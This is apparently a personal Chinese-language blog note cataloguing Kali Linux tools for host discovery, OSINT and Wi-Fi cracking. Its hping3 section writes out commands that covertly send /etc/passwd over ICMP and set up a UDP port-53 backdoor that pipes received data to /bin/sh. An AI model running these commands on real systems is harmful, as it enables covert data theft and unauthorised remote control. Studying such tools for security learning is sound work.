---
title: Kali从0到1
abbrlink: 8b8ae737
date: 2022-09-30 08:13:21
tags:
---

# 工具大全

## 信息收集

### 存活主机识别

- **arping**：

  - 类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网
  - -t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上
  - 还行吧，可能ping不管用的时候可以用，哦还可以用来捞mac地址

- **fping**：

  - ping的加强版，fping可以在命令行中指定要ping的主机范围

  - 与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。

  - ```shell
    fping IP1 IP2 IP3 ...
    fping -f filename
    fping -g IP1 IP2
    可以添加-a参数来只显示存活主机
    ```

  - ping的升级版（自己写歌脚本貌似也差不多）

- **hping3**：

  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。

  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS

  - ```
    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了
    -p 指定端口
    -I 指定网卡
    -c 指定发包次数
    ```

  - **文件传输**

    - Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：

    - ```shell
      hping3 源IP --listen signature --safe  --icmp
      ```

    - 监听ICMP包中的签名，根据签名解析出文件内容。

    - 在发送端使用签名打包的ICMP包发送文件：

    - ```shell
      hping3 目标IP --icmp -d 100 --sign signature --file /etc/passwd
      ```

    - 将`/etc/passwd`密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。

  - **反弹shell功能**

    - 如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。

    - 示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。

    - 在木马启动端：

    - ```
      hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh
      ```

    - 在远程控制端：

    - ```
      echo ls >test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd
      ```

    - 将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。

    - 当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。

  - 好高级的说，可以自定义的部分也很多，也有一些有趣的应用，可冲

- **masscan**：

  - 又一个扫描工具，给个例子就过，好快啊

  - ```
    masscan -p80,8080-8100 10.0.0.0/8 
    （扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）
    可使用--echo把当前配置输出到文件，-c使用文件
    --source-ip 指定源IP
    --excludefile 文件 指定网段忽略
    --max-rate 100000 最高发包速率
    --banners 获取banner信息，支持少量的协议
    ```

  - md你快有个卵子用，扫不出来端口存活信息啊

- **thcping6**：

  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包
  - 学了IPV6再来

### 路由分析

- **netdiscover**：
  
  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测
  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器
  - 也可以直接输入网卡让他自己跑两层
  - 每天一个被打电话小技巧
  
- **netmask**：

  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换

  - ```
    Usage: netmask spec [spec ...]
      -h, --help                    Print a summary of the options
      -v, --version                 Print the version number
      -d, --debug                   Print status/progress information
      -s, --standard                Output address/netmask pairs
      -c, --cidr                    Output CIDR format address lists
      -i, --cisco                   Output Cisco style address lists
      -r, --range                   Output ip address ranges
      -x, --hex                     Output address/netmask pairs in hex
      -o, --octal                   Output address/netmask pairs in octal
      -b, --binary                  Output address/netmask pairs in binary
      -n, --nodns                   Disable DNS lookups for addresses
      -f, --files                   Treat arguments as input files
    Definitions:
      a spec can be any of:
        address
        address:address
        address:+address
        address/mask
      an address can be any of:
        N           decimal number
        0N          octal number
        0xN         hex number
        N.N.N.N     dotted quad
        hostname    dns domain name
      a mask is the number of bits set to one from the left
    ```

  - 这个看官方文档吧

### 情报分析

- **spiderfoot**：

  - 一个可以自动进行大量查询的工具
  - 启动需要指定好监听的IP和端口，然后浏览器直接访问就行啦
  - 好用的耶，一些资产搜寻不用手动做了，而且还可以没事搜搜自己来保护自己

- **theHarvester**：

  - 这个嘛就是一个手动的搜索工具啦，直接看官方文档就好

  - ```
    -d	--domain					要搜索的公司名称或域名。
    -l	--limit						限制搜索结果的数量，默认=500。
    -S	--start						从结果编号 X 开始，默认 = 0。
    -g	--google-dork			使用 Google Dorks 进行 Google 搜索。
    -p	--proxies					对请求使用代理，在 proxies.yaml 中输入代理
    -s	--shodan					使用 Shodan 查询发现的主机。
    --screenshot					对已解析的域进行截图，指定输出目录：--screenshot output_directory
    -v	--virtual-host		通过 DNS 解析验证主机名并搜索虚拟主机。
    -e	--dns-server			用于查找的 DNS 服务器。
    -f	--filename				将结果保存到 XML 和 JSON 文件。
    -b	--source					指定搜索的引擎和数据源
    
    #theHarvester -d [url] -l 300 -b [搜索引擎名称]
    ```

  - 没上一个自动化的好用，不开心😒

## 漏洞分析

### Fuzzing工具集













## Web程序

## 数据库评估软件

## 密码攻击

## 无线攻击

### 蓝牙工具集

### 无线工具集

- **bully**：

  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码

  - 使用方法

  - ```shell
    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道
    ```

  - 可以看到有许多参数，他们的获取方式我们会在后面提到

  - 还没有试过，改天尝试一下

- **Fern WiFi Cracker**：

  - 图形化的Wi-Fi破解工具，可以通过破解路由到设备的加密包来实现Wi-Fi密码解析
  - 等我笔记本kali装好的（

## 逆向工程

## 漏洞利用工具集

## 嗅探/欺骗

### 网络欺骗

- **sslsplit**：
